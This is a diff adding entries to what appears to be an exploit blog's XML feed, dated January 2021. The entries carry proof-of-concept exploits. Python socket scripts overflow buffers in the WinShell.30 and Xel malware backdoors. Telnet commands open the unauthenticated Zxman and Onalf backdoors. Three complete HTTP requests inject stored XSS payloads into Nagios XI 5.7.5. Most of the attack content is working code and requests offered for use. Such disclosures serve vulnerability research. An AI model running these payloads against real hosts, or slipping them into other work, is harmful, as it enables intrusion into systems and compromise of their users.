@@ -4,6 +4,133 @@
   
   
   <entry>
+    <title>Backdoor.Win32.WinShell.30 Remote Stack Buffer Overflow / Missing Authentication</title>
+    <link href="/2021/01/22/Backdoor-Win32-WinShell-30-Remote-Stack-Buffer-Overflow-Missing-Authentication/"/>
+    <url>/2021/01/22/Backdoor-Win32-WinShell-30-Remote-Stack-Buffer-Overflow-Missing-Authentication/</url>
+    
+    <content type="html"><![CDATA[<h4 id="Backdoor-Win32-WinShell-30-Remote-Stack-Buffer-Overflow-Missing-Authentication"><a href="#Backdoor-Win32-WinShell-30-Remote-Stack-Buffer-Overflow-Missing-Authentication" class="headerlink" title="Backdoor.Win32.WinShell.30 Remote Stack Buffer Overflow / Missing Authentication"></a>Backdoor.Win32.WinShell.30 Remote Stack Buffer Overflow / Missing Authentication</h4><p>Backdoor.Win32.WinShell.30 malware suffers from remote stack buffer overflow and missing authentication vulnerabilities.</p><p>Exploit/PoC-1:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *<br><br>MALWARE_HOST=<span class="hljs-string">&quot;x.x.x.x&quot;</span><br>PORT=<span class="hljs-number">5277</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">doit</span>():</span><br>    s=socket(AF_INET, SOCK_STREAM)<br>    s.connect((MALWARE_HOST, PORT))<br><br>    PBARBAR = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">1875</span>+<span class="hljs-string">&quot; HTTP/1.1\r\nHost: &quot;</span>+MALWARE_HOST+<span class="hljs-string">&quot;\r\n\r\n&quot;</span><br>    s.send(PBARBAR)<br>    s.close()<br><br>    print(<span class="hljs-string">&quot;Backdoor.Win32.WinShell.30 / Remote Stack Buffer Overflow&quot;</span>);<br>    print(<span class="hljs-string">&quot;MD5: 56a2b135c8d35561ea5b04694155eb77&quot;</span>);<br>    print(<span class="hljs-string">&quot;By Malvuln&quot;</span>);<br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    doit()<br></code></pre></div></td></tr></table></figure><p>Exploit/PoC-2:<br>TELNET x.x.x.x 5277</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Exploit</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Remote Stack Buffer Overflow</tag>
+      
+      <tag>Missing Authentication</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Backdoor.Win32.Zxman Missing Authentication</title>
+    <link href="/2021/01/22/Backdoor-Win32-Zxman-Missing-Authentication/"/>
+    <url>/2021/01/22/Backdoor-Win32-Zxman-Missing-Authentication/</url>
+    
+    <content type="html"><![CDATA[<h4 id="Backdoor-Win32-Zxman-Missing-Authentication"><a href="#Backdoor-Win32-Zxman-Missing-Authentication" class="headerlink" title="Backdoor.Win32.Zxman Missing Authentication"></a>Backdoor.Win32.Zxman Missing Authentication</h4><p>Backdoor.Win32.Zxman malware has a backdoor running on TCP/2048 that does not require any authentication.</p><p>Exploit/PoC:<br>TELNET x.x.x.x 2048</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Exploit</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Missing Authentication</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Backdoor.Win32.Onalf Missing Authentication</title>
+    <link href="/2021/01/22/Backdoor-Win32-Onalf-Missing-Authentication/"/>
+    <url>/2021/01/22/Backdoor-Win32-Onalf-Missing-Authentication/</url>
+    
+    <content type="html"><![CDATA[<h4 id="Backdoor-Win32-Onalf-Missing-Authentication"><a href="#Backdoor-Win32-Onalf-Missing-Authentication" class="headerlink" title="Backdoor.Win32.Onalf Missing Authentication"></a>Backdoor.Win32.Onalf Missing Authentication</h4><p>Exploit/PoC:<br>TELNET x.x.x.x 2020</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Exploit</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Missing Authentication</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Nagios XI 5.7.5 Cross Site Scripting</title>
+    <link href="/2021/01/22/Nagios-XI-5-7-5-Cross-Site-Scripting/"/>
+    <url>/2021/01/22/Nagios-XI-5-7-5-Cross-Site-Scripting/</url>
+    
+    <content type="html"><![CDATA[<h4 id="Nagios-XI-5-7-5-Cross-Site-Scripting"><a href="#Nagios-XI-5-7-5-Cross-Site-Scripting" class="headerlink" title="Nagios XI 5.7.5 Cross Site Scripting"></a>Nagios XI 5.7.5 Cross Site Scripting</h4><p>POC<br>Exploit Details : The following request will create a tool with an XSS payload. Click on the URL link for the malicious tool to trigger the payload.</p><p>POST /nagiosxi/tools/mytools.php HTTP/1.1<br>Host: TARGET<br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:84.0) Gecko/20100101 Firefox/84.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 145<br>Origin: <a href="http://target/">http://TARGET</a><br>Connection: close<br>Referer: <a href="http://target/nagiosxi/tools/mytools.php?edit=1">http://TARGET/nagiosxi/tools/mytools.php?edit=1</a><br>Cookie: nagiosxi=5kbmap730ic023ig2q0bpdefas<br>Upgrade-Insecure-Requests: 1</p><p>nsp=a2569a2507c7c69600769ca7388614b4264ab9479c560ac62bbc5f9fd76c2524&amp;update=1&amp;id=-1&amp;name=XSS+Test&amp;url=%27+onclick%3D%27alert%281%29&amp;updateButton=</p><hr><p>POC 2<br>Exploit Details : The following request will create a BPI group with an XSS payload.  Click on the Group ID for the malicious BPI group to trigger the payload.</p><p>POST /nagiosxi/includes/components/nagiosbpi/index.php?cmd=add HTTP/1.1<br>Host: TARGET<br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 186<br>Origin: <a href="http://target/">http://TARGET</a><br>Connection: close<br>Referer: <a href="http://target/nagiosxi/includes/components/nagiosbpi/index.php?cmd=add&amp;tab=add">http://TARGET/nagiosxi/includes/components/nagiosbpi/index.php?cmd=add&amp;tab=add</a><br>Cookie: nagiosxi=6lg3d4mqgsgsllclli1hch00td<br>Upgrade-Insecure-Requests: 1</p><p>groupID=%27onclick%3Dalert%281%29%2F%2F&amp;groupType=default&amp;groupTitle=TEST&amp;groupDesc=&amp;groupInfoUrl=&amp;groupPrimary=1&amp;groupWarn=90&amp;groupCrit=80&amp;groupDisplay=2&amp;addSubmitted=true</p><hr><p>POC 3<br>Exploit Details : The following request will create a view with an XSS payload.  Click on the malicious view to trigger the payload.</p><p>POST /nagiosxi/ajaxhelper.php HTTP/1.1<br>Host: TARGET<br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0<br>Accept: <em>/</em><br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br>X-Requested-With: XMLHttpRequest<br>Content-Length: 147<br>Origin: <a href="http://target/">http://TARGET</a><br>Connection: close<br>Referer: <a href="http://target/nagiosxi/account/">http://TARGET/nagiosxi/account/</a><br>Cookie: nagiosxi=6lg3d4mqgsgsllclli1hch00td</p><p>cmd=addview&amp;url=javascript:alert(1)&amp;title=TESTVIEW&amp;submitButton=&amp;nsp=c97136052a4b8d7d535c7d4a7a32389a5882c65cb34f2c36b849f72af52b2056</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Exploit</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Cross Site Scripting</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Backdoor.Win32.Xel Remote Authentication Buffer Overflow</title>
+    <link href="/2021/01/22/Backdoor-Win32-Xel-Remote-Authentication-Buffer-Overflow/"/>
+    <url>/2021/01/22/Backdoor-Win32-Xel-Remote-Authentication-Buffer-Overflow/</url>
+    
+    <content type="html"><![CDATA[<h4 id="Backdoor-Win32-Xel-Remote-Authentication-Buffer-Overflow"><a href="#Backdoor-Win32-Xel-Remote-Authentication-Buffer-Overflow" class="headerlink" title="Backdoor.Win32.Xel Remote Authentication Buffer Overflow"></a>Backdoor.Win32.Xel Remote Authentication Buffer Overflow</h4><p>Backdoor.Win32.Xel malware suffers from a remote authentication-related buffer overflow vulnerability.</p><p>Exploit/PoC-1:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">TELNET x.x.x.x 8023<br><br>Enter a long string for password.<br></code></pre></div></td></tr></table></figure><p>Exploit/PoC-2:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *<br><br>MALWARE_HOST=<span class="hljs-string">&quot;x.x.x.x&quot;</span><br>PORT=<span class="hljs-number">8023</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">doit</span>():</span><br>    s=socket(AF_INET, SOCK_STREAM)<br>    s.connect((MALWARE_HOST, PORT))<br><br>    PBARBAR=<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">200</span>+<span class="hljs-string">&quot; HTTP/1.1\r\nHost: &quot;</span>+MALWARE_HOST+<span class="hljs-string">&quot;\r\n\r\n&quot;</span><br>    s.send(PBARBAR)<br>    s.close()<br><br>    print(<span class="hljs-string">&quot;Backdoor.Win32.Xel / Remote Authentication Buffer Overflow&quot;</span>)<br>    print(<span class="hljs-string">&quot;MD5: 3648c68bfe395fb9980ae547d881572c&quot;</span>)<br>    print(<span class="hljs-string">&quot;By Malvuln&quot;</span>);<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    doit()<br></code></pre></div></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Exploit</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Remote Authentication Buffer Overflow</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Backdoor.Win32.Zombam.geq Remote Buffer Overflow</title>
     <link href="/2021/01/21/Backdoor-Win32-Zombam-geq-Remote-Buffer-Overflow/"/>
     <url>/2021/01/21/Backdoor-Win32-Zombam-geq-Remote-Buffer-Overflow/</url>
